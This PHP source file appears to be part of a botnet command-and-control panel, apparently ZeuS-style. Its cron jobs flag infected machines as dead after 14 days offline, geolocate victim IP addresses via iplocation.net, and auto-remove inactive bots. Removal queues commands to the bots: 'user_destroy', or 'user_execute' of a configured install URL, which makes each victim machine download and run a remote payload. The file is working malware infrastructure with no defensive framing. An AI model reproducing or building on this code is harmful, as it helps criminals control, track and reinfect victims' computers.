<?php
require_once 'system/lib/dbpdo.php';
require_once 'system/lib/util.php';
require_once 'system/lib/shortcuts.php';

/** CronJobs concerning files/
 */
class cronjobs_bots implements ICronJobs {
    const DEAD_FLAG_DAYS = 14;

    /** Set the "dead" flag on bots that are potentially dead (were not online for DEAD_FLAG_DAYS days)
     * @cron period: 6h
     */
    function cronjob_flag_dead(){
        $db = dbPDO::singleton();
        $q = $db->query(
            'UPDATE `botnet_list`
             SET `flags` = CONCAT_WS(",", `flags`, "dead")
             WHERE `rtime_last` <= :dead_time
            ', array(
            ':dead_time' => time() - 60*60*24*self::DEAD_FLAG_DAYS
        ));

        return array('skeletons found' => $q->rowCount());
    }

    /** Perform the `whois` lookup on new bots
     * @cron period: 2m
     */
    function cronjob_whois(){
        $db = dbPDO::singleton();

        # Select bots with missing whois data
        $q = $db->query(
            'SELECT `bot_id`, `ipv4`
             FROM `botnet_list`
             WHERE
                `whois_info` IS NULL
             ORDER BY RAND()
             LIMIT 5
             ;');
        $q->execute();

        # Perform the whois lookup
        $whoises = array(); # bot_id => whois

        while ($bot = $q->fetchObject()){
            $ip = binaryIpToString($bot->ipv4);
            $data = file_get_contents('http://www.iplocation.net/index.php?query='.urlencode($ip));
            list($geoip, $hostname) = geolocation_parse($data);

            if (strncmp($geoip, 'E:', 2) !== 0)
                $whoises[ $bot->bot_id ] = "$geoip $hostname";
        }

        # Update bots
        foreach ($whoises as $bot_id => $whois)
            $db->query(
                'UPDATE `botnet_list`
                 SET `whois_info`=:whois
                 WHERE `bot_id`=:bot_id
                ;',array(
                ':bot_id' => $bot_id,
                ':whois' => $whois,
            ));

        return array('updated' => count($whoises));
    }

    /** Autoremove bots which did not have any recent activity
     * @cron period: 24h
     * @cron weight: 15
     */
    function cronjob_bots_autorm(){
        $status = array('status' => 'disabled', 'removed' => 0);
        $test = isset($_GET['TEST']);
        if ($test)
            $status = array_merge($status, array( 'matching' => 'none', 'script' => 'none', 'reports' => array(), 'bots' => array() ));

        # Enabled?
        if (!isset($GLOBALS['config']['bots']['autorm']))
            return $status;

        $db = dbPDO::singleton();
        $cfg = $GLOBALS['config']['bots']['autorm'];
        if (!$test && !$cfg['enabled'])
            return $status;

        # Collect matching bots
        $status['status'] = 'enabled';
        $bots = array();

        if (empty($cfg['links'])){
            $test && $status['matching'] = 'bots that were not online';

            $q = $db->query(
                'SELECT `bot_id`
                 FROM `botnet_list`
                 WHERE `rtime_last` <= :rtime_last', array(
                ':rtime_last' => time() - 60*60*24*$cfg['days']
            ));
            $bots = $q->fetchAll(PDO::FETCH_COLUMN);
        } else {
            $test && $status['matching'] = 'bots with no activity on URLs';

            $report_tables = array_slice(array_keys($db->report_tables()), -$cfg['days']);
            $test && $status['reports'] = $report_tables;

            $queries = array();
            foreach ($report_tables as $yymmdd)
                $queries[] = "
                SELECT `bot_id`
                FROM `botnet_reports_{$yymmdd}`
                WHERE `path_source` REGEXP :regexp
                GROUP BY `bot_id`
                ";
            if (empty($queries)) return $status;

            $q = $db->query(
                'SELECT `bot_id`
                 FROM `botnet_list`
                 WHERE `bot_id` NOT IN (' . implode($queries, ') UNION DISTINCT (') . ')
                 ;', array(
                    ':regexp' => '^('.wildcarts_or_body($cfg['links']).')',
                ));
            $bots = $q->fetchAll(PDO::FETCH_COLUMN);
        }

        # Filter matching bots: only those with no scripts
        $q = $db->prepare('SELECT 1 FROM `botnet_scripts` WHERE `name` LIKE :name');
        $bots = array_filter($bots, function($botId)use($q){
            $q->execute(array(
                ':name' => "auto:bots:autorm:{$botId}:%"
            ));
            return $q->rowCount() == 0;
        });
        $test && $status['bots'] = $bots;

        # Remove them
        foreach ($bots as $botId)
            switch ($cfg['action']){
                case 'none':
                    $status['script'] = '<none>';
                    break;
                case 'destroy':
                    $status['script'] = 'user_destroy';
                    $test || add_simple_script($botId, "auto:bots:autorm:{$botId}:destroy", "user_destroy");
                    break;
                case 'install':
                    $status['script'] = "user_execute {$cfg['install_url']} && user_destroy";
                    $test || add_simple_script($botId, "auto:bots:autorm:{$botId}:install", "user_execute {$cfg['install_url']}\nuser_destroy"); // 2 scripts
                    break;
            }

        $status['removed'] = count($bots);
        return $status;
    }
}
